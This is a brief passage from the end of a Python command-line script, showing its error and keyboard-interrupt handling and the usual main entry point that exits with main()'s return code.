        print(f"advanced: {e}", file=sys.stderr)
        return 1
    except KeyboardInterrupt:
        return 130


if __name__ == "__main__":
    sys.exit(main())
